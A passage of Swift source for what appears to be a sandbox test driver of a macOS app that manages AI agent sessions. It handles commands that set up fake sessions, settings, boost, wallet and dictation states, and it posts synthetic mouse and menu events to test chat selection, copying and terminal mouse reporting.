            startFake(label: label.isEmpty ? "Fake \(agent?.displayName ?? "Shell") \(fakeCount + 1)" : label, agent: agent) { problem in
                reply(problem == nil, problem ?? "started")
            }
        case "startlead": startRealLead(reply)
        case "lead":
            // Started once; then its chat, once its board is read, at the end (where its pinned questions are).
            let show = { [weak self] in
                guard let self else { return }
                self.chat("lead") { ok, text in
                    guard ok else { return reply(ok, text) }
                    self.waitFor({ [weak self] in self?.model.selectedRow.flatMap { self?.leads.lead(for: $0) } != nil }) { [weak self] met in
                        self?.window?.chat.scrollToBottom()
                        self?.settle { reply(met, met ? text + ", its team read" : "the lead's board wasn't read") }
                    }
                }
            }
            if fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) { return show() }
            // A transcript of your own making for it (a long one, to time the chat on): its lines instead of the made-up ones.
            var transcript: String?
            if !rest.isEmpty {
                guard rest.hasPrefix("/"), let text = try? String(contentsOfFile: rest, encoding: .utf8) else { return reply(false, "no transcript at \(rest)") }
                transcript = text
            }
            startLead(transcript: transcript) { problem in if let problem { reply(false, problem) } else { show() } }
        case "toolchain" where rest == "dismiss":
            leads.dismissToolchainNote { [weak self] in self?.settle { reply(true, "developer tools notice dismissed") } }
        case "toolchain":
            let file = state.appendingPathComponent("toolchain-\(UUID().uuidString).json")
            let before = ToolchainSnapshot(developerDir: "/Applications/Xcode.app/Contents/Developer", swift: "Apple Swift version 6.4.1",
                                           sdkPath: "/SDKs/MacOSX27.sdk", sdkVersion: "27", commandLineTools: "27.0", xcodeExists: true)
            ToolchainWatch(file: file, read: { before }).look()
            var changed = before
            changed.swift = "Apple Swift version 6.4.2"
            let after = changed
            leads.watchToolchain(ToolchainWatch(file: file, read: { after }))
            leads.lookAtToolchain { [weak self] in self?.settle { reply(true, "developer tools notice shown") } }
        case "hangs":
            // The main thread's freezes so far, as the app's health digest tells them, and its longest wait for a beat.
            let folders = AppHealth.Folders(debug: watchdog.folder, reports: state.appendingPathComponent("no-crashes"))
            var lines = folders.hangNames().map { AppHealth.Watch.line([folders.hang($0)]) }
            if let longest = watchdog.longestGap(reset: rest == "reset") {
                lines.append(String(format: "longest between beats (0.25 s apart when free): %.2f s, ended %@", longest.gap, "\(longest.at)"))
            }
            reply(true, lines.isEmpty ? "none" : lines.joined(separator: "\n"))
        case "team" where rest == "named": startNamedTeam { problem in reply(problem == nil, problem ?? "worker and verifier started, the lead's agent in its worktrees folder") }
        case "team": startWorker { problem in reply(problem == nil, problem ?? "worker started") }
        case "unfold":
            guard let row = model.selectedRow else { return reply(false, "nothing selected") }
            if !model.expandedTeams.contains(row.id) { model.toggleTeam(row.id) }
            settle { reply(true, "\(row.title)'s team shown") }
        case "rotation":
            guard let id = model.selectedRow?.hostID else { return reply(false, "no fake session selected") }
            leads.rotationNotices[id] = "Started a fresh lead session (the last one's context was 72% full)"
            settle { reply(true, "scheduled rotation chat line shown in the fake session") }
        case "replaced":
            guard let row = model.selectedRow, let id = row.hostID, let tty = row.session?.tty else { return reply(false, "no window session selected") }
            var replaced = ReplacedLead(root: row.cwd ?? home, project: "sandbox-lead", tty: tty, live: nil)
            replaced.draft = String(repeating: "split the layer out, then the next one\n", count: (Int(rest) ?? 200_000) / 39 + 1)
            model.replacedLeads[id] = replaced
            settle { reply(true, "\(row.title) shown replaced, \(replaced.draft.count) characters typed into it") }
        case "push": pushRequest(rest) { problem in
            reply(problem == nil, problem ?? (rest.isEmpty ? "the lead asks to push main to origin (a scratch bare remote): its card is under the lead's chat" : "settled as \(rest)"))
        }
        case "confighold": configHold(rest) { problem in
            reply(problem == nil, problem ?? (rest != "accept" ? "the agents' config held (~/.claude/settings.json, ~/.zshrc in the sandbox's home): its card is under the lead's chat" : "accepted"))
        }
        case "ask": ask(rest, answer: false) { problem in reply(problem == nil, problem ?? "the lead asks you") }
        case "answer": ask("", answer: true) { problem in reply(problem == nil, problem ?? "its questions answered") }
        case "leadmail": leadMail { problem in reply(problem == nil, problem ?? "5 messages between leads in the fake lead's record, one refused; its Team tab shows them under Between leads") }
        case "extras": extras { problem in reply(problem == nil, problem ?? "the lead's board has a proposal, a revised question, an all-done card and results") }
        case "phone": servePhone(reply)
        case "dictation": dictate(rest, reply)
        case "soak": soak(rest, reply)
        case "select":
            guard let row = WindowGroups.filter(model.sections, query: rest).first?.rows.first else { return reply(false, "no row matches \(rest)") }
            model.selectedID = row.id
            reply(true, "selected \(row.title)")
        case "home":
            model.showHome()
            reply(true, "start page shown")
        case "settings":
            let words = rest.split(separator: " ").map(String.init)
            guard let tab = words.isEmpty ? .general : SettingsTab(rawValue: words[0]) else {
                return reply(false, "no category \(rest): " + SettingsTab.allCases.map(\.rawValue).joined(separator: ", "))
            }
            // A section's old name, or any option's id in the catalog.
            let section = words.count > 1 ? SettingsSection(rawValue: words[1]) : nil
            let option = words.count > 1 ? section?.option ?? words[1] : nil
            if let option, SettingsCatalog.option(option) == nil { return reply(false, "no option \(option): boost, review-floor, or an id in the settings catalog") }
            if section == .reviewFloor { _ = Driver.floorProject(home: home) }
            showSettings(tab, option: option)
            settle { reply(true, "settings shown on \(self.settings?.searchSelection.tab.rawValue ?? tab.rawValue)" + (option.map { " at \($0)" } ?? "")) }
        case "settings-help":
            guard let selection = settings?.searchSelection else { return reply(false, "no settings shown") }
            guard let note = SettingsNote(rawValue: rest) else {
                return reply(false, "settings-help NOTE: " + SettingsNote.allCases.map(\.rawValue).joined(separator: ", "))
            }
            selection.openHelp = note
            settle { selection.openHelp = nil; reply(true, "help open for \(note.section)") }
        case "settings-search":
            if settings == nil { showSettings(.general) }
            guard let selection = settings?.searchSelection else { return reply(false, "no settings shown") }
            selection.query = rest
            settle {
                let found = selection.results
                reply(true, rest.isEmpty ? "search cleared" : "\(found.count) found: " + found.prefix(8).map { "\($0.id) (\($0.category.title))" }.joined(separator: ", "))
            }
        case "settings-pick":
            guard let selection = settings?.searchSelection else { return reply(false, "no settings shown") }
            let results = selection.results
            guard let option = Int(rest).flatMap({ results.indices.contains($0 - 1) ? results[$0 - 1] : nil }) ?? SettingsCatalog.option(rest) else {
                return reply(false, "settings-pick N (1 to \(results.count)) or a catalog id")
            }
            selection.pick(option)
            settle { reply(true, "picked \(option.id): \(selection.tab.title) › \(option.section)") }
        case "sheet": showSheet(rest, reply)
        case "boost":
            let now = Date().timeIntervalSince1970
            switch rest {
            case "off": preferences.boostMode = .off
            case "on": (preferences.boostMode, boostSignals) = (.on, (true, false, AccountUsage()))
            case "away": (preferences.boostMode, boostSignals) = (.automatic, (true, true, AccountUsage()))
            case "present": (preferences.boostMode, boostSignals) = (.automatic, (true, false, AccountUsage()))
            case "battery":
                preferences.boostOnBattery = false
                (preferences.boostMode, boostSignals) = (.automatic, (false, true, AccountUsage()))
            case "battery-on", "battery-low":
                preferences.boostOnBattery = true
                boostCharge = rest == "battery-on" ? 86 : 24
                (preferences.boostMode, boostSignals) = (.on, (false, false, AccountUsage()))
            case "veto":
                let limit = AccountUsage.Limit(name: "five_hour", usedPercent: 84, resetsAt: now + 7200, at: now)
                (preferences.boostMode, boostSignals) = (.automatic, (true, true, AccountUsage(limits: [limit])))
            case "mark":
                // The main window's Boost mark clicked, as the toolbar's button does.
                guard window?.boostMarkItem != nil else { return reply(false, "no Boost mark: boost is off") }
                window?.onBoostMark()
                return settle { reply(true, "the Boost mark clicked: Settings › Performance at Boost") }
            default: return reply(false, "boost off|on|away|present|battery|battery-on|battery-low|veto|mark")
            }
            boostWatch.look { [weak self] in self?.settle { reply(true, self?.boostWatch.state?.text ?? "not decided") } }
        case "shell-ask": shellAsk(rest, reply)
        case "shell-click": shellClick(rest, reply)
        case "shell-fail":
            guard rest == "on" || rest == "off" else { return reply(false, "shell-fail on|off") }
            shellLaunchFails = rest == "on"
            reply(true, "shell requests' Runs \(shellLaunchFails ? "fail to start" : "start")")
        case "wallet-ask": walletAsk(Array(words.dropFirst()), reply)
        case "wallet-card": let (ok, text) = walletCardText(); reply(ok, text)
        case "wallet-later":
            guard let minutes = Double(rest), minutes > 0 else { return reply(false, "wallet-later MINUTES (more than 0)") }
            walletClock.advance(minutes * 60)
            walletDesk.refresh(polling: false) { [weak self] in
                self?.settle { reply(true, "the wallet desk's clock moved \(rest) min ahead\n" + (self?.walletCardText().1 ?? "")) }
            }
        case "wallet-page": walletPage(rest.isEmpty ? "wallet-page" : rest, reply)
        case "wallet-click": walletClick(rest, reply)
        case "wallet-peer":
            guard ["none", "chosen", "this-mac", "this-mac-stopped"].contains(rest) else { return reply(false, "wallet-peer none|chosen|this-mac|this-mac-stopped") }
            if rest.hasPrefix("this-mac") {
                // The Wallet Manager's side, as it makes it: the pair, owner-only, and .listening (this process's id)
                // while it takes requests.
                let (to, listening) = (walletLocal.toFolder, walletLocal.toFolder.appendingPathComponent(WalletLocalLink.listeningName))
                do {
                    try VibePaths.ensurePrivate(to)
                    try VibePaths.ensurePrivate(walletLocal.fromFolder)
                    if rest == "this-mac" { try VibePaths.writePrivate(Data("\(getpid())\n".utf8), to: listening) } else { try? FileManager.default.removeItem(at: listening) }
                } catch {
                    return reply(false, "the stand-in Wallet Manager couldn't make its folders: \(error)")
                }
                walletPeer = WalletAsk.WalletManager.onThisMac
                preferences.walletPeerID = walletPeer
            } else {
                walletPeer = rest == "none" ? "" : Driver.walletPeers[0].peerID
                if rest == "chosen" { preferences.walletPeerID = walletPeer }
            }
            walletDesk.refresh(polling: false) { [weak self] in
                self?.settle { reply(true, "Wallet Manager peer: \(rest)\n" + (self?.walletCardText().1 ?? "")) }
            }
        case "wallet-answer": walletAnswer(rest, reply)
        case "wallet":
            let state = rest.isEmpty ? "waiting-for-you" : rest
            guard state == "all" || Self.walletCards.contains(where: { $0.state == state }) else {
                return reply(false, "no wallet state \(state): " + (Self.walletCards.map(\.state) + ["all"]).joined(separator: ", "))
            }
            showSheet("wallet-" + state, reply)
        case "close":
            switch rest {
            case "settings": settings?.close()
            case "sheet": closeSheet()
            default: return reply(false, "close settings or close sheet")
            }
            reply(true, "closed \(rest)")
        case "shot": shot(rest.isEmpty ? "shot" : rest, reply)
        case "layershot": shot(rest.isEmpty ? "shot" : rest, draw: Sandbox.drawLayers, reply)
        case "panes":
            // A shot draws a glass sidebar and inspector blank or without their colors on macOS 27: `panes off` leaves them out.
            guard rest == "on" || rest == "off", let split = window?.window?.contentViewController as? NSSplitViewController else {
                return reply(false, "panes on|off")
            }
            split.splitViewItems.filter { $0.behavior != .default }.forEach { $0.isCollapsed = rest == "off" }
            settle { reply(true, "sidebar and inspector \(rest == "off" ? "collapsed" : "shown")") }
        case "pointer": pointer(Array(words.dropFirst()), reply)
        case "unproved":
            key.stranger = SymmetricKey(size: .bits256)
            host.confirmKeyReset = { _, _ in false }
            host.connectAgain()
            reply(true, "connecting again with a key the host doesn't hold")
        case "quit":
            reply(true, "quitting")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) { NSApp.terminate(nil) }
        case "help", "":
            reply(true, Self.commands.map { "\($0.name): \($0.help)" }.joined(separator: "\n"))
        default:
            reply(false, "no command \(words[0]); these are:\n" + Self.commands.map { "  \($0.name): \($0.help)" }.joined(separator: "\n"))
        }
    }

    // MARK: The pointer over the chat

    /// The shown chat's message text views, top to bottom, each writing to the sandbox's own pasteboard.
    private func chatTexts() -> [ChatTextView] {
        guard let root = window?.window?.contentView else { return [] }
        var found: [ChatTextView] = []
        func walk(_ view: NSView) {
            if let text = view as? ChatTextView { found.append(text); return }
            view.subviews.forEach(walk)
        }
        walk(root)
        for text in found where text.pasteboard == .general { text.pasteboard = sandboxPasteboard }
        return found.sorted { $0.convert($0.bounds, to: nil).maxY > $1.convert($1.bounds, to: nil).maxY }
    }

    private let sandboxPasteboard = NSPasteboard(name: NSPasteboard.Name("VibeSwitcherSandbox-\(getpid())"))

    /// A point (in the window) on the first line of the message holding `text`: on that text when found, else its start.
    private func point(onMessage text: String) -> (ChatTextView, NSPoint)? {
        guard let view = chatTexts().first(where: { $0.string.localizedCaseInsensitiveContains(text) }),
              let layout = view.layoutManager, let container = view.textContainer else { return nil }
        let at = (view.string as NSString).range(of: text, options: .caseInsensitive)
        let glyphs = layout.glyphRange(forCharacterRange: NSRange(location: at.location, length: min(max(at.length, 1), 3)), actualCharacterRange: nil)
        let rect = layout.boundingRect(forGlyphRange: glyphs, in: container)
        return (view, view.convert(NSPoint(x: rect.minX + 1, y: rect.midY), to: nil))
    }

    private func mouseEvent(_ type: NSEvent.EventType, at point: NSPoint, clicks: Int = 1) -> NSEvent? {
        NSEvent.mouseEvent(with: type, location: point, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
                           windowNumber: window?.window?.windowNumber ?? 0, context: nil, eventNumber: 0, clickCount: clicks,
                           pressure: type == .leftMouseDown || type == .rightMouseDown ? 1 : 0)
    }

    private func describe(_ view: NSView?) -> String {
        guard let view else { return "nothing" }
        return String(describing: type(of: view)).prefix(60).description
    }

    /// `pointer rows|areas TEXT|hover TEXT|hover-beside TEXT|drag FROM TO|drag-window FROM TO|copy|menu TEXT`.
    private func pointer(_ words: [String], _ reply: @escaping (Bool, String) -> Void) {
        guard let nsWindow = window?.window, let content = nsWindow.contentView else { return reply(false, "no window") }
        let what = words.first ?? "rows"
        let rest = words.dropFirst().joined(separator: " ")
        switch what {
        case "rows":
            let lines = chatTexts().map { text -> String in
                let frame = text.convert(text.bounds, to: nil)
                let shown = !text.visibleRect.isEmpty && text.visibleRect.intersects(text.bounds)
                return "\(shown ? "on screen " : "off screen")  y \(Int(frame.minY))…\(Int(frame.maxY))  tooltip \(text.toolTip ?? "none")  “\(text.string.prefix(40).replacingOccurrences(of: "\n", with: " "))”"
            }
            reply(true, lines.isEmpty ? "no messages shown" : lines.joined(separator: "\n"))
        case "hover", "hover-beside":
            // hover: onto the message's text; hover-beside: 15 pt left of it (a reply's mark, a prompt bubble's edge).
            guard let (view, onText) = point(onMessage: rest) else { return reply(false, "no message holds \(rest)") }
            let at = what == "hover" ? onText : NSPoint(x: view.convert(view.bounds, to: nil).minX - 15, y: onText.y)
            let frame = content.superview ?? content
            let hit = frame.hitTest(frame.convert(at, from: nil))
            // As AppKit hands the pointer's moves to the tracking areas' owners (here, SwiftUI's hosting views).
            // First a mouseEntered: naming the area (its tracking number is the area, as the window's are), then the moves.
            var owners: [NSResponder] = []
            var current: NSView? = hit
            while let v = current {
                for area in v.trackingAreas where area.options.contains(.mouseMoved) && (area.options.contains(.inVisibleRect) || area.rect.contains(v.convert(at, from: nil))) {
                    guard let owner = area.owner as? NSResponder, !owners.contains(where: { $0 === owner }) else { continue }
                    owners.append(owner)
                    if let entered = NSEvent.enterExitEvent(with: .mouseEntered, location: at, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
                                                            windowNumber: nsWindow.windowNumber, context: nil, eventNumber: 0,
                                                            trackingNumber: Int(bitPattern: Unmanaged.passUnretained(area).toOpaque()), userData: nil) {
                        owner.mouseEntered(with: entered)
                    }
                }
                current = v.superview
            }
            for dx in [-2.0, -1, 0] {
                guard let moved = mouseEvent(.mouseMoved, at: NSPoint(x: at.x + dx, y: at.y)) else { continue }
                owners.forEach { $0.mouseMoved(with: moved) }
            }
            settle { reply(true, "pointer at \(Int(at.x)),\(Int(at.y)) on \(self.describe(hit)), moves to \(owners.map { String(describing: type(of: $0)).prefix(30) }); the message's tooltip now \(view.toolTip ?? "none")") }
        case "drag", "drag-window":
            guard words.count >= 3, let (from, start) = point(onMessage: words[1]), let (_, end) = point(onMessage: words[2...].joined(separator: " ")) else {
                return reply(false, "drag FROM TO: each a text one of the shown messages holds")
            }
            let frame = content.superview ?? content
            let hit = frame.hitTest(frame.convert(start, from: nil))
            guard let down = mouseEvent(.leftMouseDown, at: start) else { return reply(false, "no event") }
            // The drag's moves 50 ms apart, as a hand's come (the run loop turns between them: SwiftUI updates, the chat
            // scrolls), then the button up there; it holds still there 0.5 s first when the end is off the chat's view.
            let moves = (1...12).compactMap { step -> NSEvent? in
                let t = Double(step) / 12
                return mouseEvent(.leftMouseDragged, at: NSPoint(x: start.x + (end.x + 30 - start.x) * t, y: start.y + (end.y - start.y) * t))
            }
            // Run loop timers, in the common modes: the drag's tracking loop turns the run loop in its own, and this
            // command runs in a block of the main queue, which runs no other block until it's done.
            func later(_ delay: TimeInterval, _ event: NSEvent) {
                let timer = Timer(timeInterval: delay, repeats: false) { _ in NSApp.postEvent(event, atStart: false) }
                RunLoop.main.add(timer, forMode: .common)
            }
            for (index, move) in moves.enumerated() { later(0.05 * Double(index + 1), move) }
            let offView = !(content.bounds.contains(content.convert(end, from: nil)))
            if let up = mouseEvent(.leftMouseUp, at: NSPoint(x: end.x + 30, y: end.y)) {
                later(0.05 * Double(moves.count + 1) + (offView ? 0.5 : 0), up)
            }
            // As the window hands a press to the view under it (the window isn't key: a key one does the same).
            // drag-window: through the window's sendEvent, as the window server's event comes (a window not key takes a
            // first click to become key unless the view under it accepts first mouse).
            if what == "drag-window" { nsWindow.sendEvent(down) } else { hit?.mouseDown(with: down) }
            settle {
                let focused = nsWindow.firstResponder as? ChatTextView
                let selected = focused?.selectedPlainText() ?? ""
                reply(!selected.isEmpty, "window key \(nsWindow.isKeyWindow), pressed on \(self.describe(hit)) (first mouse \(hit?.acceptsFirstMouse(for: down) ?? false)) (the message's text view: \(hit === from)), first responder \(self.describe(nsWindow.firstResponder as? NSView)); selected: “\(selected)”")
            }
        case "copy":
            _ = chatTexts()
            sandboxPasteboard.clearContents()
            // Only a message's own text view: it writes to the sandbox's pasteboard, anything else to the general one.
            guard let focused = nsWindow.firstResponder as? ChatTextView else {
                return reply(false, "the first responder is \(describe(nsWindow.firstResponder as? NSView)), not a message: not copied")
            }
            // ⌘C as the main menu has it, sent to the window's first responder (the window isn't key, so not through NSApp's key window).
            // (The sandbox puts up no menu bar: the app's own menu, as AppDelegate installs it.)
            let item = MainMenu.build().items.compactMap(\.submenu).flatMap(\.items).first { $0.keyEquivalent == "c" && $0.keyEquivalentModifierMask == .command }
            let handled = item.flatMap(\.action).map { NSApp.sendAction($0, to: focused, from: item) } ?? false
            let copied = sandboxPasteboard.string(forType: .string)
            reply(copied != nil, "menu item \(item?.title ?? "none"), handled \(handled), first responder \(describe(nsWindow.firstResponder as? NSView)); copied: “\(copied ?? "")”")
        case "areas":
            // The tracking areas over the message holding TEXT, from its view up to the window, and each owner's kind.
            guard let (view, at) = point(onMessage: rest) else { return reply(false, "no message holds \(rest)") }
            var lines: [String] = []
            var current: NSView? = view
            while let v = current {
                let local = v.convert(at, from: nil)
                for recognizer in v.gestureRecognizers {
                    lines.append("\(describe(v)): recognizer \(String(describing: type(of: recognizer)).prefix(60)) delays primary \(recognizer.delaysPrimaryMouseButtonEvents) enabled \(recognizer.isEnabled)")
                }
                for area in v.trackingAreas where area.rect.contains(local) || area.options.contains(.inVisibleRect) {
                    lines.append("\(describe(v)): owner \(area.owner.map { String(describing: type(of: $0)).prefix(50).description } ?? "none") options \(String(area.options.rawValue, radix: 16))")
                }
                current = v.superview
            }
            reply(true, lines.joined(separator: "\n"))
        case "menu":
            guard let (_, at) = point(onMessage: rest) else { return reply(false, "no message holds \(rest)") }
            let frame = content.superview ?? content
            let hit = frame.hitTest(frame.convert(at, from: nil))
            guard let event = mouseEvent(.rightMouseDown, at: at), let menu = hit?.menu(for: event) else {
                return reply(false, "no menu on \(describe(hit))")
            }
            reply(true, "on \(describe(hit)): " + menu.items.map { $0.isSeparatorItem ? "—" : $0.title }.joined(separator: ", "))
        default:
            reply(false, "pointer rows|areas TEXT|hover TEXT|hover-beside TEXT|drag FROM TO|drag-window FROM TO|copy|menu TEXT")
        }
    }

    // MARK: The terminal's mouse and Edit menu

    /// The shown terminal, its window and what it reads as now.
    private func shownTerminal() -> (HostTerminalView, NSWindow)? {
        guard let terminal = window?.pane.currentView, let shown = terminal.window, !terminal.isHiddenOrHasHiddenAncestor else { return nil }
        return (terminal, shown)
    }

    private func terminalState(_ terminal: HostTerminalView) -> String {
        let shown = terminal.window
        let responder = shown?.firstResponder.map { String(describing: type(of: $0)) } ?? "none"
        let selected = terminal.selection.active ? "“\(terminal.selection.getSelectedText())”" : "nothing"
        return "keyboard: \(shown?.firstResponder === terminal ? "the terminal" : responder); mouse mode \(terminal.getTerminal().mouseMode); selected: \(selected)"
    }

    /// A drag from the first line's start to the second line's 30th column, given to the view the window's hit test finds
    /// there, as the window gives a click (so whatever covers the terminal takes it, as it would yours).
    private func dragInTerminal(_ keys: Set<String>, _ reply: @escaping (Bool, String) -> Void) {
        guard let (terminal, shown) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
        var flags: NSEvent.ModifierFlags = []
        if keys.contains("option") { flags.insert(.option) }
        if keys.contains("shift") { flags.insert(.shift) }
        if keys.contains("command") { flags.insert(.command) }
        let screen = terminal.getTerminal()
        let cell = NSSize(width: terminal.bounds.width / CGFloat(max(screen.cols, 1)), height: terminal.bounds.height / CGFloat(max(screen.rows, 1)))
        func point(col: Int, row: Int) -> NSPoint {
            terminal.convert(NSPoint(x: (CGFloat(col) + 0.5) * cell.width, y: terminal.bounds.height - (CGFloat(row) + 0.5) * cell.height), to: nil)
        }
        let start = point(col: 0, row: 0)
        let hit = shown.contentView?.superview?.hitTest(start)
        let hitName = hit.map { $0 === terminal ? "the terminal" : $0.isDescendant(of: terminal) ? "inside the terminal (\(type(of: $0)))" : String(describing: type(of: $0)) } ?? "nothing"
        let before = terminalState(terminal)
        var number = 0
        func send(_ type: NSEvent.EventType, _ location: NSPoint) {
            number += 1
            guard let event = NSEvent.mouseEvent(with: type, location: location, modifierFlags: flags, timestamp: ProcessInfo.processInfo.systemUptime,
                                                 windowNumber: shown.windowNumber, context: nil, eventNumber: number, clickCount: 1,
                                                 pressure: type == .leftMouseUp ? 0 : 1) else { return }
            // To the view the click hits, as the window hands it on: the window itself drops a made-up click in an app
            // that isn't active (the sandbox never is).
            guard let target = hit else { return }
            switch type {
            case .leftMouseDown: target.mouseDown(with: event)
            case .leftMouseDragged: target.mouseDragged(with: event)
            default: target.mouseUp(with: event)
            }
        }
        send(.leftMouseDown, start)
        for col in stride(from: 5, through: 30, by: 5) { send(.leftMouseDragged, point(col: col, row: col < 30 ? 0 : 1)) }
        send(.leftMouseUp, point(col: 30, row: 1))
        settle { reply(true, "the click hit \(hitName)\nbefore: \(before)\nafter: \(self.terminalState(terminal))") }
    }

    /// ⌘KEY as the menu bar takes it: the window's own key equivalents first, then the menu's item, sent up the
    /// responder chain from the first responder to the first that takes the action and enables it (the sandbox's
    /// window is never key, so AppKit's own lookup would start nowhere).
    private func pressMenuKey(_ key: String, _ reply: @escaping (Bool, String) -> Void) {
        guard let (terminal, shown) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
        let menu = NSApp.mainMenu ?? MainMenu.build()
        func find(_ menu: NSMenu) -> NSMenuItem? {
            for item in menu.items {
                if item.keyEquivalent == key, item.keyEquivalentModifierMask == .command { return item }
                if let sub = item.submenu, let found = find(sub) { return found }
            }
            return nil
        }
        guard let item = find(menu), let action = item.action else { return reply(false, "no menu item for ⌘\(key)") }
        var responder: NSResponder? = shown.firstResponder
        var chain: [String] = []
        while let next = responder, !next.responds(to: action) {
            chain.append(String(describing: type(of: next)))
            responder = next.nextResponder
        }
        guard let target = responder else { return reply(false, "⌘\(key) (\(item.title)): nothing in the chain takes it: \(chain.joined(separator: " → "))") }
        let enabled = (target as? NSMenuItemValidation)?.validateMenuItem(item)
            ?? (target as? NSUserInterfaceValidations)?.validateUserInterfaceItem(item) ?? true
        let who = target === terminal ? "the terminal" : String(describing: type(of: target))
        guard enabled else { return reply(true, "⌘\(key) (\(item.title)): \(who) takes it, disabled now\n\(terminalState(terminal))") }
        NSApp.sendAction(action, to: target, from: item)
        let id = window?.pane.current
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.6) { [weak self] in
            guard let self else { return }
            let lines = id.map { self.window?.pane.screenLines($0).suffix(3).joined(separator: " ⏎ ") ?? "" } ?? ""
            reply(true, "⌘\(key) (\(item.title)) went to \(who)\npasteboard: “\(NSPasteboard.general.string(forType: .string) ?? "")”\n"
                + "\(self.terminalState(terminal))\nlast lines: \(lines)")
        }
    }

    /// The shown session's program turns mouse reporting on or off: a fake Claude prints it; a shell's view reads it
    /// as if its program had.
    private func mouseReporting(_ on: Bool, _ reply: @escaping (Bool, String) -> Void) {
        guard let (terminal, _) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
        let codes = on ? "\u{1b}[?1002h\u{1b}[?1006h" : "\u{1b}[?1002l\u{1b}[?1006l"
        if let fake = fakeList.first(where: { $0.id == window?.pane.current }), fake.control != nil {
            let file = state.appendingPathComponent("mouse-\(on ? "on" : "off")")
            try? VibePaths.writePrivate(Data(codes.utf8), to: file)
            tellFake(fake, #"{"op": "print", "file": "\#(file.path)"}"#)
        } else {
            terminal.feed(text: codes)
        }
        waitFor({ (terminal.getTerminal().mouseMode != .off) == on }) { done in
            reply(done, "mouse mode \(terminal.getTerminal().mouseMode)")
        }
    }

    /// The main window's view tree in numbers: each display cycle walks all of it (tracking areas, cursor rects, the
    /// key-view loop), so its size is what a stall in those scales with.
    private func views() -> String {
        guard let root = window?.window?.contentView?.superview else { return "no window" }
        var kinds: [String: Int] = [:], total = 0, deepest = 0, keyLoop = 0
        var hosts: [String] = []
        func size(_ view: NSView) -> Int { view.subviews.reduce(1) { $0 + size($1) } }
        func walk(_ view: NSView, _ depth: Int) {
            total += 1
            if view is NSHostingView<AnyView> || String(describing: type(of: view)).hasPrefix("NSHostingView") {
                hosts.append("  host at depth \(depth): \(size(view)) views, \(Int(view.frame.width))×\(Int(view.frame.height)), \(String(describing: type(of: view)).prefix(50))")
            }
            deepest = max(deepest, depth)
            if view.canBecomeKeyView { keyLoop += 1 }
            kinds[String(describing: type(of: view)).prefix(60).description, default: 0] += 1
            view.subviews.forEach { walk($0, depth + 1) }
        }
        walk(root, 0)
        let top = kinds.sorted { $0.value > $1.value }.filter { $0.value > 4 || $0.key.contains("KeyView") }.map { "  \($0.value) \($0.key)" }
        return (["\(total) views, \(deepest) deep, \(keyLoop) can be key views"] + top + hosts).joined(separator: "\n")
    }

    private func status() -> String {
        let app = NSApp as? SandboxApplication
        var lines = ["pid \(getpid())", "state \(state.path)", "home \(home)", "vibeswitcher \(VibePaths.root.path)",
                     "defaults \(state.appendingPathComponent("defaults.plist").path)",
                     "host \(host.state) on \(VibePaths.hostSocket.path), started with: \(host.hostArguments.joined(separator: " "))",
                     "shots \(shots.path)"]
        for fake in fakeList { lines.append("fake \(fake.label) on \(fake.tty), pid \(fake.pid), host id \(fake.id)") }
        for window in NSApp.windows where window.isVisible {
            lines.append("window \(type(of: window)) “\(window.title)” \(NSStringFromRect(window.frame)) alpha \(window.alphaValue)")
        }
        lines.append("selected \(model.selectedRow?.title ?? "none"), chat \(model.showsChat ? "on" : "off"), chat state \(window?.chat.state ?? .none)")
        lines.append("active \(NSApp.isActive), activation policy \(NSApp.activationPolicy().rawValue)")
        for line in (app?.refused ?? []) + refused { lines.append("refused \(line)") }
        for line in app?.foundOnScreen ?? [] { lines.append("on screen \(line)") }
        return lines.joined(separator: "\n")
    }

    private func chat(_ text: String, _ reply: @escaping (Bool, String) -> Void) {
        let fake = fakeList.first { text.isEmpty || $0.label.localizedCaseInsensitiveContains(text) } ?? (text.isEmpty ? nil : fakeList.first)
        guard let fake else { return reply(false, "no fake session\(text.isEmpty ? "" : " matching \(text)")") }
        model.select(hostID: fake.id)
        model.showsChat = true
        waitFor({ [weak self] in self?.window?.chat.state == .ready && self?.composer() != nil }) { [weak self] met in
            guard let self else { return }
            self.window?.chat.poll()
            self.settle { reply(met, met ? "chat of \(fake.label) shown" : "the chat of \(fake.label) didn't load: \(self.window?.chat.state ?? .none)") }
        }
    }

    /// `dictation key|nokey|note|ack|press|release|letgo|cancel|turnon`.
    private func dictate(_ what: String, _ reply: @escaping (Bool, String) -> Void) {
        switch what {
        case "key", "nokey":
            dictationKey.write(what == "key" ? "sk-sandbox-\(String(repeating: "0", count: 24))" : nil)
            dictation.checkKey()
            settle { reply(true, what == "key" ? "a made-up key is saved" : "no key: the mic says one is needed") }
        case "note":
            UserDefaults.standard.removeObject(forKey: DictationController.privacyNotedKey)
            reply(true, "the next press shows the note about OpenAI")
        case "ack":
            dictation.acknowledgePrivacy()
            settle { reply(true, "the note about OpenAI was read: a press records") }
        case "press", "release", "letgo":
            guard let row = model.selectedRow else { return reply(false, "no session selected: chat NAME first") }
            let (agent, key) = (row.session?.agent, row.draftKey)
            if what == "press" { dictation.press(key, agent: agent) { "Words that may come up: sandbox." } } else { dictation.release(key) }
            let claude = dictation.isClaude(key)
            waitFor({ [weak self] in
                guard let dictation = self?.dictation else { return true }
                // Claude's: held until it listens (or says why not); let go until the text is in the composer (letgo: until
                // it waits for it).
                if claude, what == "letgo" { return !dictation.isRecording(key) }
                if claude { return what == "press" ? dictation.isListening(key) || !dictation.isBusy(key) : !dictation.isBusy(key) }
                return !dictation.isTranscribing(key)
            }) { [weak self] _ in
                self?.settle { reply(true, "\(self?.dictation.phase(key) ?? .idle)\(self?.dictation.isListening(key) == true ? ", listening" : "")") }
            }
        case "cancel":
            guard let row = model.selectedRow else { return reply(false, "no session selected: chat NAME first") }
            let key = row.draftKey
            dictation.cancel(key, .button)
            waitFor({ [weak self] in self?.dictation.isBusy(key) == false }) { [weak self] _ in
                self?.settle { reply(true, "cancelled: \(self?.dictation.phase(key) ?? .idle)") }
            }
        case "turnon":
            guard let row = model.selectedRow else { return reply(false, "no session selected: chat NAME first") }
            let key = row.draftKey
            dictation.turnOnClaude(key)
